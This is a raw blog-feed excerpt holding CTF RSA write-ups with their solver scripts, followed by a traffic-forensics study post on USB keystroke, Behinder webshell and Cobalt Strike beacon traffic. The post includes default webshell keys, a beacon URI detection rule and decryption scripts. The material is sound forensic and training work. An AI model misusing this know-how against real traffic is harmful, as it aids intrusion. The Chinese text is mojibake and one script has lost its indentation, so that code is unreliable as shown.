href="https://4xwi11.github.io/posts/b83e9e49/#Romeo%E2%80%99s-Encrypting-Machine">20211211-ç¾å›¢CTF | 4XWi11â€™s Blog</a></p><h1 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h1><h2 id="é¢˜ç›®-3"><a href="#é¢˜ç›®-3" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = <span class="hljs-number">65537</span><br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>s = getPrime(<span class="hljs-number">256</span>)<br>M = getPrime(<span class="hljs-number">5048</span>)<br>hint = (p - <span class="hljs-number">297498275426</span>) * inverse(s, M) % M<br>t = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;message.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>t.write(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>\nc = <span class="hljs-subst">&#123;c&#125;</span>\nn = <span class="hljs-subst">&#123;n&#125;</span>\nM = <span class="hljs-subst">&#123;M&#125;</span>\nhint = <span class="hljs-subst">&#123;hint&#125;</span>\n&quot;</span>)<br>t.close()<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>$hint \equiv (p-297498275426)\cdot s^{-1} \mod M$<br>ä»¤$pâ€™&#x3D;p-297498275426$ï¼Œåˆ™æœ‰$hint\equiv pâ€™\cdot s^{-1}\mod M$<br>å› æ­¤$pâ€™&#x3D; hint\cdot s - kM$<br>æ„é€ æ ¼<br>$$<br>(s,-k)<br>\begin{pmatrix}<br>1 &amp; hint \newline<br>0 &amp; M<br>\end{pmatrix}<br>&#x3D;(s,pâ€™)<br>$$</p><p>ä¹‹åæ±‚å‡º$pâ€™$ä¹Ÿå°±æ±‚å‡ºäº†$p$ï¼Œåç»­ç®€å•RSAè§£å¯†å³å¯</p><h2 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage10.6</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span><br>n = <span class="hljs-number">99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span><br>M = <span class="hljs-number">28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span><br>hint = <span class="hljs-number">24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span><br><br><br>G = Matrix(ZZ,[[<span class="hljs-number">1</span>,hint],[<span class="hljs-number">0</span>,M]])<br>L = G.LLL()[<span class="hljs-number">0</span>]<br>s , p1 = L<br>s = <span class="hljs-built_in">abs</span>(s)<br>p1 = <span class="hljs-built_in">abs</span>(p1)<br><span class="hljs-built_in">print</span>(s,p1)<br>p = p1 + <span class="hljs-number">297498275426</span><br>q = n//p<br><span class="hljs-keyword">assert</span> n == p*q<br><span class="hljs-built_in">print</span>(p*q)<br>d = inverse(e , (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c , d , n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="hamburgerRSA"><a href="#hamburgerRSA" class="headerlink" title="hamburgerRSA"></a>hamburgerRSA</h1><h2 id="é¢˜ç›®-4"><a href="#é¢˜ç›®-4" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()<br>nbit = <span class="hljs-number">64</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p, q = getPrime(nbit), getPrime(nbit)<br>    PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>    QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br>    <span class="hljs-keyword">if</span> isPrime(PP) <span class="hljs-keyword">and</span> isPrime(QQ):<br>        <span class="hljs-keyword">break</span><br><br>n = PP * QQ<br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¢˜ç›®ä¸­çš„PPï¼ŒQQçš„ç”Ÿæˆæ–¹å¼ååˆ†ç‰¹åˆ«ï¼Œæ˜¯ç”±64bitçš„ç´ æ•°$p,q$æ‹¼æ¥è€Œæˆçš„<br>æˆ‘ä»¬è®¾$x&#x3D; len(str(p)),y&#x3D;len(str(q))$ï¼Œåˆ™æœ‰ï¼š<br>$PP &#x3D; 10^{x+2y} p+10^{2y} p+10^y q+q$<br>$QQ &#x3D; 10^{2x+y} q+10^{2x} q+10^x p+p$<br>$n &#x3D; 10^{3x+3y}pq + â€¦+pq$<br>å› æ­¤æˆ‘ä»¬å¯ä»¥å‘ç°$n$çš„é«˜ä½å’Œä½ä½éƒ½æš´éœ²äº†$pq$çš„é«˜ä½å’Œä½ä½<br>ç”±äº$p,q$çš„ä½æ•°å¯èƒ½ä¸º$19,20$ï¼Œå› æ­¤$pq$çš„ä½æ•°å¤§æ¦‚åœ¨$38,39,40$é™„è¿‘ï¼Œè€Œè€ƒè™‘åˆ°è¿›ä½ç­‰æƒ…å†µï¼Œé«˜ä½æ³„éœ²çš„ä½æ•°å¤§æ¦‚éƒ½åœ¨$18,19$é™„è¿‘ã€‚<br>ä¸­é—´å‰©ä¸‹çš„ä½æ•°æ•°æ®æˆ‘ä»¬å¯ä»¥ç›´æ¥çˆ†ç ´ã€‚</p><h2 id="è§£ç­”-2"><a href="#è§£ç­”-2" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage10.6</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits<br><br>n = <span class="hljs-number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span><br>c = <span class="hljs-number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><br><br><br>high = <span class="hljs-built_in">str</span>(n)[:<span class="hljs-number">18</span>]<br>low = <span class="hljs-built_in">str</span>(n)[-<span class="hljs-number">18</span>:]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    pq = high + <span class="hljs-built_in">str</span>(i) + low<br>    pq_temp = [i <span class="hljs-keyword">for</span> i,_ <span class="hljs-keyword">in</span> factor(<span class="hljs-built_in">int</span>(pq))]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pq_temp) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> pq_temp[<span class="hljs-number">0</span>].nbits() == <span class="hljs-number">64</span>:<br>        p, q = pq_temp<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>PP = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q))<br>QQ = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(q) + <span class="hljs-built_in">str</span>(p) + <span class="hljs-built_in">str</span>(p))<br><br>d = inverse(<span class="hljs-number">65537</span>, (PP-<span class="hljs-number">1</span>)*(QQ-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="RomeoAndJuliet"><a href="#RomeoAndJuliet" class="headerlink" title="RomeoAndJuliet"></a>RomeoAndJuliet</h1>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-æµé‡åˆ†æ</title>
    <link href="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ç”¨æ¥è®°å½•æˆ‘çš„æµé‡åˆ†æå­¦ä¹ ä¹‹è·¯ï¼Œä¸»è¦åŒ…æ‹¬è‡ªå·±é‡åˆ°çš„ä¸€äº›é¢˜ç›®å’Œå­¦ä¹ å¤§ä½¬åšå®¢å­¦åˆ°çš„ä¸€äº›ä¸œè¥¿ï¼Œä¹‹å‰çš„æµé‡åˆ†æä¸€ç›´éƒ½æ˜¯é›¶é›¶ç¢ç¢çš„å­¦çš„ï¼Œè¿™æ¬¡å‡†å¤‡åšä¸€ä¸ªæ•´åˆï¼Œä»¥åä¹Ÿä¼šåœ¨é‡è§æ–°é¢˜å‹æ—¶å®æ—¶æ›´æ–°(â—â°à±ªâ°â—)<br>å‚è€ƒï¼š<br><a href="https://goodlunatic.github.io/posts/5422d65/">Misc-Network Traffic Analysis - âš¡Lunatic BLOGâš¡</a></p><h2 id="USBæµé‡åˆ†æ"><a href="#USBæµé‡åˆ†æ" class="headerlink" title="USBæµé‡åˆ†æ"></a>USBæµé‡åˆ†æ</h2><h3 id="é”®ç›˜æµé‡åˆ†æ"><a href="#é”®ç›˜æµé‡åˆ†æ" class="headerlink" title="é”®ç›˜æµé‡åˆ†æ"></a>é”®ç›˜æµé‡åˆ†æ</h3><p>åœ¨é”®ç›˜æµé‡åˆ†æä¸­ï¼Œæœ€é‡è¦çš„å°±æ˜¯8å­—èŠ‚çš„<code>usbhid</code>æ•°æ®ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æå–å‡ºè¿™äº›<code>hid</code>æ•°æ®ï¼Œç„¶åæˆ‘ä»¬ä¾¿å¯ä»¥è¿˜åŸå‡ºæŒ‰é”®è®°å½•ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›é¢˜ç›®ä¼šç”¨<code>&lt;DEL&gt;</code>æŒ‰é”®ï¼Œå¦‚æœå¿½ç•¥è¯¥æŒ‰é”®å°±ä¼šä¸çŸ¥é“å‡ºé¢˜äººåˆ é™¤äº†å“ªäº›æ•°æ®ã€‚</p><h2 id="Webshellæµé‡åˆ†æ"><a href="#Webshellæµé‡åˆ†æ" class="headerlink" title="Webshellæµé‡åˆ†æ"></a>Webshellæµé‡åˆ†æ</h2><h3 id="å†°èæµé‡åˆ†æ"><a href="#å†°èæµé‡åˆ†æ" class="headerlink" title="å†°èæµé‡åˆ†æ"></a>å†°èæµé‡åˆ†æ</h3><p>å†°èçš„é»˜è®¤å¯†é’¥ï¼š<code>e45e329feb5d925b</code>ï¼ˆè¯¥å¯†é’¥ä¸ºé»˜è®¤è¿æ¥å¯†ç <code>rebeyond</code>32ä½md5å€¼çš„å‰16ä½ï¼‰<br>åœ¨æµé‡åŒ…ä¸­å¯»æ‰¾æœ¨é©¬æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢è¯­å¥è¿›è¡Œè¿‡æ»¤ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http.request.method==<span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161305614.png"><br>æ‰¾åˆ°æœ€å¯ç–‘çš„æµé‡ï¼Œç„¶åå³é”®è¿½è¸ªæµï¼Œå¤§æ¦‚ç‡èƒ½å¤Ÿçœ‹è§åŠ å¯†ä»£ç <br><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161454680.png"><br>æˆ‘ä»¬é€šè¿‡åŠ å¯†ä»£ç å¯ç–‘ç¡®å®šï¼Œè¯¥æœ¨é©¬è¿›è¡Œäº†AES128+BASE64çš„åŠ å¯†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¯†ç å¯¹æ•°æ®åŒ…è¿›è¡Œè§£å¯†ï¼Œä¸€èˆ¬æ˜¯AES-CBCæ¨¡å¼ï¼ŒIVæ˜¯ï¼š</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br></code></pre></td></tr></table></figure><p><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250805161759498.png"><br>å†è¿˜åŸå¾—åˆ°çš„BASE64æ•°æ®ä¸€èˆ¬å°±èƒ½å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ã€‚</p><h3 id="Cobalt-Strikeæµé‡åˆ†æ"><a href="#Cobalt-Strikeæµé‡åˆ†æ" class="headerlink" title="Cobalt Strikeæµé‡åˆ†æ"></a>Cobalt Strikeæµé‡åˆ†æ</h3><p><strong>å‚è€ƒï¼š</strong> <a href="https://5ime.cn/cobaltstrike-decrypt.html#%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86">æµ…æCobaltStrikeæµé‡è§£å¯†</a><br><strong>ç‰¹å¾ï¼š</strong> CSä¼šé€šè¿‡ä¸€ä¸ªexeæ–‡ä»¶ä½¿ç”¨Httpåè®®ä»æŒ‡å®šæœåŠ¡å™¨ä¸‹è½½ä¸€ä¸ªstageã€‚æœ€æ˜æ˜¾çš„ç‰¹å¾å°±æ˜¯Httpçš„è¯·æ±‚è·¯å¾„ï¼Œå®ƒç¬¦åˆä¸€ä¸ªchecksum8è§„åˆ™ï¼Œå³å®ƒçš„è·¯å¾„ä¸º<strong>å››ä¸ªå­—æ¯æˆ–æ•°å­—</strong>ï¼Œå¹¶ä¸”å…¶ASCIIç ä¹‹å’Œæ¨¡256ç­‰äº92ï¼ˆå¯¹åº”32ä½Beaconï¼‰æˆ–93ï¼ˆå¯¹åº”64ä½Beaconï¼‰<br><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250827172132500.png"><br><strong>æ€è·¯</strong>ï¼šè§£å¯†æˆ‘ä»¬å¯ä»¥è¿‡æ»¤å‡ºé€šä¿¡æ•°æ®è¿›è¡Œè¿½è¸ªï¼Œç„¶åæˆ‘ä»¬å°±èƒ½å¤Ÿæ‰¾åˆ°åŠ å¯†æ•°æ®<br><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250827173104580.png"><br><img src="/2025/08/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250828015921863.png"><br>å¯¹äºä¸€èˆ¬çš„é¢˜ç›®ï¼Œéƒ½èƒ½å¤Ÿä»æµé‡åŒ…ä¸­å¯¼å‡º<code>.cobaltstrike.beacon_keys</code>æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬èƒ½å¤Ÿä»è¯¥æ–‡ä»¶ä¸­ç›´æ¥æå–å‡ºå¯†é’¥ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> javaobj.v2 <span class="hljs-keyword">as</span> javaobj<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;.cobaltstrike.beacon_keys&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fd:<br>    pobj = javaobj.load(fd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_key</span>(<span class="hljs-params">key_data, key_type</span>):<br>    key_data = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x &amp; <span class="hljs-number">0xFF</span>, key_data))<br>    formatted_key = <span class="hljs-string">f&quot;-----BEGIN <span class="hljs-subst">&#123;key_type&#125;</span> KEY-----\n&quot;</span><br>    formatted_key += base64.encodebytes(key_data).decode()<br>    formatted_key += <span class="hljs-string">f&quot;-----END <span class="hljs-subst">&#123;key_type&#125;</span> KEY-----&quot;</span><br>    <span class="hljs-keyword">return</span> formatted_key<br><br>privateKey = format_key(pobj.array.value.privateKey.encoded.data, <span class="hljs-string">&quot;PRIVATE&quot;</span>)<br>publicKey = format_key(pobj.array.value.publicKey.encoded.data, <span class="hljs-string">&quot;PUBLIC&quot;</span>)<br><br><span class="hljs-built_in">print</span>(privateKey)<br><span class="hljs-built_in">print</span>(publicKey)<br></code></pre></td></tr></table></figure><p>è·å–åˆ°ç§é’¥ä¹‹åï¼Œä½¿ç”¨<a href="https://github.com/WBGlIl/CS_Decrypt/blob/main/Beacon_metadata_RSA_Decrypt.py">CS_Decrypt&#x2F;Beacon_metadata_RSA_Decrypt.py at main Â· WBGlIl&#x2F;CS_Decrypt</a>è¿›è¡Œæå–<br>å¯ä»¥è·å¾—å…·ä½“å¾—AES keyå’ŒHMAC keyï¼Œä¹‹åå†ä½¿ç”¨åœ°å€<a href="https://github.com/WBGlIl/CS_Decrypt/blob/main/Beacon_Task_return_AES_Decrypt.py">CS_Decrypt&#x2F;Beacon_Task_return_AES_Decrypt.py at main Â· WBGlIl&#x2F;CS_Decrypt</a>è¿›è¡Œè§£å¯†ï¼Œè§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Beaconä»»åŠ¡æ‰§è¡Œç»“æœè§£å¯†</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compare_mac</span>(<span class="hljs-params">mac, mac_verif</span>):<br><span class="hljs-keyword">if</span> mac == mac_verif:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(mac) != <span class="hljs-built_in">len</span>(mac_verif):<br><span class="hljs-built_in">print</span><br><span class="hljs-string">&quot;invalid MAC size&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>result = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(mac, mac_verif):<br>result |= x ^ y<br><br><span class="hljs-keyword">return</span> result == <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="hljs-string">&quot;sha256&quot;</span>).digest()[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>], signature):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;message authentication failed&quot;</span>)<br><span class="hljs-keyword">return</span><br><br>cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)<br>data = cypher.decrypt(encrypted_data)<br><span class="hljs-keyword">return</span> data<br><br><span class="hljs-comment">#å¯†é’¥</span><br>SHARED_KEY = binascii.unhexlify(<span class="hljs-string">&quot;a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7&quot;</span>)<br>HMAC_KEY = binascii.unhexlify(<span class="hljs-string">&quot;35d34ac8778482751682514436d71e09&quot;</span>)<br><br>enc = <span class="hljs-string">&quot;00000050350ca7f4379f30cc9d6d671db886d360691c74467156e60e8356725ae2f3b880b302ea8b5556df10324e86e53ecb84046646a1758e9cb8c7fca42d660617be467627abcc3c0ce3bd3e93c02fffcb4d3a&quot;</span><br>encrypt_data=binascii.unhexlify(enc)<br><br><br>encrypt_data_length=encrypt_data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br><br>encrypt_data_length=<span class="hljs-built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><br>encrypt_data_l = encrypt_data[<span class="hljs-number">4</span>:<span class="hljs-built_in">len</span>(encrypt_data)]<br><br>data1=encrypt_data_l[<span class="hljs-number">0</span>:encrypt_data_length-<span class="hljs-number">16</span>]<br>signature=encrypt_data_l[encrypt_data_length-<span class="hljs-number">16</span>:encrypt_data_length]<br>iv_bytes = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;abcdefghijklmnop&quot;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)<br><br><br>counter = dec[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>counter=<span class="hljs-built_in">int</span>.from_bytes(counter, byteorder=<span 